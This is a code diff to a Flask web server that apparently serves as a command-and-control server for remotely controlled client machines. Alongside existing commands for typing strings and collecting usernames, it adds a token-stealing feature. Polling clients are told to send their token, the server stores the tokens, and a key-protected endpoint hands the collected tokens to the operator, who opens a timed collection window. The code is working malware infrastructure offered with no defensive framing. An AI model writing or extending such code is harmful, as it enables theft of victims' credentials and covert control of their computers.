@@ -44,7 +44,29 @@ typestring: str = ""
 typestring_delay: float = 0.0
 typestring_ips: list[str] = []
 
+tokens: list[str] = []
+gettoken_ips: list[str] = []
+get_token: bool = False
+
 # Centers
+
+
+@app.route("/gettokens-center", methods=["GET", "POST"])
+def gettoken_center() -> Response:
+    global gettoken_ips, get_token, tokens
+    if request.method == "GET":
+        if not get_token:
+            return Response("dont grab token", 204)
+        else:
+            return Response("send me ur token pls", 200)
+    elif request.method == "POST":
+        remote_ip = get_remote_address()
+        if get_token and remote_ip not in gettoken_ips:
+            tokens.append(request.args.get("token"))
+            gettoken_ips.append(remote_ip)
+            return Response("added token", 200)
+        else:
+            return Response("u cant do that rn", 400)
 
 
 @app.route("/typestring-center", methods=["GET"])
@@ -82,7 +104,7 @@ def getuser_center() -> Response:
         if not get_user:
             return Response("no screenshots to take", 204)
         else:
-            return Response("take screenshot", 200)
+            return Response("send username pls", 200)
     elif request.method == "POST":
         remote_ip = get_remote_address()
         if get_user and remote_ip not in getuser_ips:
@@ -214,6 +236,15 @@ def get_users() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/get_tokens", methods=["GET"])
+def get_tokens() -> Response:
+    if check_key(request.args.get("key")):
+        global tokens
+        return Response("\n".join(tokens), 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Posters
 
 
@@ -328,6 +359,15 @@ def post_typestring() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_gettokens", methods=["POST"])
+def post_gettoken() -> Response:
+    if check_key(request.args.get("key")):
+        Thread(target=post_gettoken_thread).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
@@ -418,6 +458,16 @@ def post_typestring_thread(string: str, delay: float) -> None:
     typestring_delay = 0.0
     typestring = ""
     typestring_ips = []
+
+
+def post_gettoken_thread() -> None:
+    global gettoken_ips, get_token, tokens
+    get_token = True
+    sleep(8)
+    get_token = False
+    sleep(5)
+    tokens = []
+    gettoken_ips = []
 
 
 # Static
